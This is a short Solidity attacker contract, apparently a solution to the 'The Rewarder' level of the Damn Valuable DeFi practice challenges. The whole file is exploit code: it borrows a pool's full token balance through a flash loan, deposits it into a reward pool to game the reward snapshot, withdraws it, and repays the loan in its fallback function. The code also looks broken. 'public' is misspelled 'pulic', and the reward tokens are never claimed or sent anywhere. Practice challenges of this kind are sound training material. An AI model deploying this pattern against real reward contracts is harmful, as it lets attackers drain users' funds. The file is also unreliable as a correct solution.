// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./../DamnValuableToken.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

contract Attacker {
    FlashLoanerPool pulic pool;
    DamnValuableToken public token;
    TheRewarderPool public rewarderPool;
    RewardToken public rToken;

    constructor(address _pool,address _token, address _rewarderPool, address _rToken ) public {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rToken = RewardToken(_rToken);
    }

    // since there's no "receiveFlashLoan(uint256)" function it'll fall back to here
        
    fallback() external payable {
        uint256 amount = token.balanceOf(address(this));
        token.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        token.transfer(address(pool), amount);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
    }
}